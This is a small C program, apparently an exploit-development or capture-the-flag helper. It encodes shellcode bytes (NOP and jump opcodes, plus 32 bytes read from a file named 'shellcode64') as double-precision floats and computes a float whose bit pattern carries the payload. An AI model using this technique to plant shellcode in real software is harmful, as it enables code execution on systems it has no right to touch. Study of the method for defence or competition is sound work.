#include <stdio.h>
#include <string.h>

double convert(char *value)
{
  char buf[1024];
  double d;

  memcpy(&d, value, 8);

  sprintf(buf, "%.127lg\n", d);
  printf("There you go %s", buf);
    return d;
}

int main() {    
    char s1[8] = "\xe9\x83\xff\xff\xff\x90\x90\x90";
    convert(s1);

    printf("----------------\n");
    FILE *f = fopen("shellcode64", "rb");
    double sum = 0;
    char buf[8];
    for (int i = 0; i < 4; i++) {
        fread(buf, 1, 8, f);
        sum += convert(buf);
    }
    printf("sum: %.127lg\n", sum);
    fclose(f);
    long long i = 0x07a74800601060bf;
    char s2[8];
    memcpy(s2, &i, 8);
    
    double real_sum = convert(s2);
    double v = -6.829227982918836304220545034199079666641322504050755041010797043623120834030460970923073211739641798993975261818929713387164354e-229;

    double five = 5;
    double sol = five * v - real_sum;
    printf("%.127lg\n", sol);
    long long aaa;
    memcpy(&aaa, &sol, 8);

    printf("%llx", aaa);
    
    return 0;
}
